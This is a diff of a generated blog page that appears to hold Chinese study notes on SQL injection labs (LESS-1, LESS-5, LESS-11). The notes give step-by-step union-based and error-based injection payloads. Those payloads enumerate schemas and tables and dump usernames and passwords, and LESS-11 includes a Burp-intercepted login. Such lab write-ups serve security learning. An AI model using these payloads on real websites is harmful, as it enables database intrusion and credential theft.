@@ -35,18 +35,18 @@
 
   
   
-    <meta name="description" content="LESS-1  发送get请求，?id&#x3D;1,正常输出用户名和密码 ?id&#x3D;1’报错 ?id&#x3D;-1’ or 1&#x3D;1–+正常输出，存在注入点(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行) 判断列数，?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列 查回显，?id&#x3D;-1’ union select 1,">
+    <meta name="description" content="LESS-1 （get型）  寻找注入点 发送get请求，?id&#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&#x3D;1’报错（语法错误） ?id&#x3D;-1’ or 1&#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列   联合查询 查">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL">
 <meta property="og:url" content="http://example.com/2025/10/13/SQL/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="LESS-1  发送get请求，?id&#x3D;1,正常输出用户名和密码 ?id&#x3D;1’报错 ?id&#x3D;-1’ or 1&#x3D;1–+正常输出，存在注入点(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行) 判断列数，?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列 查回显，?id&#x3D;-1’ union select 1,">
+<meta property="og:description" content="LESS-1 （get型）  寻找注入点 发送get请求，?id&#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&#x3D;1’报错（语法错误） ?id&#x3D;-1’ or 1&#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列   联合查询 查">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/img/less1.png">
 <meta property="og:image" content="http://example.com/img/less5.png">
 <meta property="og:image" content="http://example.com/img/less11.png">
 <meta property="article:published_time" content="2025-10-13T08:42:43.000Z">
-<meta property="article:modified_time" content="2025-10-17T16:24:29.848Z">
+<meta property="article:modified_time" content="2025-10-18T11:20:23.234Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/img/less1.png">
@@ -237,7 +237,7 @@
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-1"><span class="toc-number">1.</span> <span class="toc-text">LESS-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-5"><span class="toc-number">2.</span> <span class="toc-text">LESS-5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-11-%EF%BC%88post%E5%9E%8B%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">LESS-11 （post型）</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-1-%EF%BC%88get%E5%9E%8B%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">LESS-1 （get型）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-5-%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">LESS-5 （无回显）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-11-%EF%BC%88post%E5%9E%8B%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">LESS-11 （post型）</span></a></li></ol>
   
 </div>
 </div>
@@ -351,26 +351,53 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h1 id="LESS-1"><a href="#LESS-1" class="headerlink" title="LESS-1"></a>LESS-1</h1><p><img src="/./img/less1.png" alt="图片"></p>
-<ul>
+        <h1 id="LESS-1-（get型）"><a href="#LESS-1-（get型）" class="headerlink" title="LESS-1 （get型）"></a>LESS-1 （get型）</h1><p><img src="/./img/less1.png" alt="图片"></p>
+<ol>
+<li>寻找注入点<ul>
 <li>发送get请求，?id&#x3D;1,正常输出用户名和密码</li>
-<li>?id&#x3D;1’报错</li>
-<li>?id&#x3D;-1’ or 1&#x3D;1–+正常输出，存在注入点(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)</li>
-<li>判断列数，?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列</li>
-<li>查回显，?id&#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示</li>
+</ul>
+</li>
+<li>判断闭合方式<ul>
+<li>?id&#x3D;1’报错（语法错误）</li>
+<li>?id&#x3D;-1’ or 1&#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)</li>
+</ul>
+</li>
+<li>判断列数<ul>
+<li>?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列</li>
+</ul>
+</li>
+<li>联合查询<ul>
+<li>查回显，?id&#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示（id要改成不存在的，才能确定回显）</li>
 <li>查库名，?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata;–+(group_concat用于合并查询到结果)</li>
 <li>查表名，?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’;–+</li>
 <li>查列名，?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’;–+</li>
 <li>查字段，?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users;–+</li>
 </ul>
-<h1 id="LESS-5"><a href="#LESS-5" class="headerlink" title="LESS-5"></a>LESS-5</h1><p><img src="/./img/less5.png" alt="图片"></p>
-<ul>
-<li>判断是否存在注入：?id&#x3D;1’and 1&#x3D;1–+</li>
+</li>
+<li>补充<ul>
+<li>concat(str1,str2):连接成一个字符串</li>
+<li>concat_ws(07xe,str1,str2):与上面那个用法类似，但是可以指定分隔符</li>
+<li>group_concat:合并成一行显示</li>
+</ul>
+</li>
+</ol>
+<h1 id="LESS-5-（无回显）"><a href="#LESS-5-（无回显）" class="headerlink" title="LESS-5 （无回显）"></a>LESS-5 （无回显）</h1><p><img src="/./img/less5.png" alt="图片"></p>
+<ol>
+<li>确定没有回显，正确会输出”you are in…”</li>
+<li>用updatxml返回错误的参数信息<ul>
 <li>判断库名:?id&#x3D;1 ‘and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)–+</li>
 <li>判断表名:?id&#x3D;1’and updatexml(1,concat(0x7e,(select table_ name from<br>information schema.tables where table schema&#x3D;’security’),0x7e),1)–+</li>
 <li>判断列名:?id&#x3D;1’and updatexml(1,concat(0x7e.(select column_name from<br>information schema.columns where table schema&#x3D;’secunty and table name&#x3D;’emails’ ),0x7e),1)–+</li>
 <li>判断数据:?id&#x3D;1 ‘and updatexml(1.concat(Ox7e,(select id from emails limit 0.1),0x7e),1)–+</li>
 </ul>
+</li>
+<li>补充<ul>
+<li>extractvalue(1,concat(0x7e,(SELECT database()),0x7e))</li>
+<li>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</li>
+<li>当参数的格式不正确而产生的错误，会返回参数的信息</li>
+</ul>
+</li>
+</ol>
 <h1 id="LESS-11-（post型）"><a href="#LESS-11-（post型）" class="headerlink" title="LESS-11 （post型）"></a>LESS-11 （post型）</h1><p><img src="/./img/less11.png" alt="图片"></p>
 <ul>
 <li>bp拦截得到uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit可以成功登录</li>
@@ -476,7 +503,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        3.6k
+        3.7k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         00:20
@@ -512,7 +539,7 @@
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-1"><span class="toc-number">1.</span> <span class="toc-text">LESS-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-5"><span class="toc-number">2.</span> <span class="toc-text">LESS-5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-11-%EF%BC%88post%E5%9E%8B%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">LESS-11 （post型）</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-1-%EF%BC%88get%E5%9E%8B%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">LESS-1 （get型）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-5-%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">LESS-5 （无回显）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LESS-11-%EF%BC%88post%E5%9E%8B%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">LESS-11 （post型）</span></a></li></ol>
   
 </div>
 </div>
@@ -672,9 +699,9 @@
           url: "http://example.com/2025/10/13/SQL/",
           excerpt: "",
           description: "",
-          stripContent: "LESS-1  发送get请求，?id&amp;#x3D;1,正常输出用户名和密码 ?id&amp;#x3D;1’报错 ?id&amp;#x3D;-1’ or 1&amp;#x3D;1–+正常输出，存在注入点(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行) 判断列数，?id&amp;#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列 查回显，?id&amp;#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示 查库名，?id&amp;#x3D;-1’ union select ",
+          stripContent: "LESS-1 （get型）  寻找注入点 发送get请求，?id&amp;#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&amp;#x3D;1’报错（语法错误） ?id&amp;#x3D;-1’ or 1&amp;#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&amp;#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列   联合查询 查回显，?id&amp;#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示",
           date: "Mon Oct 13 2025 16:42:43 GMT+0800",
-          updated: "Sat Oct 18 2025 00:24:29 GMT+0800",
+          updated: "Sat Oct 18 2025 19:20:23 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
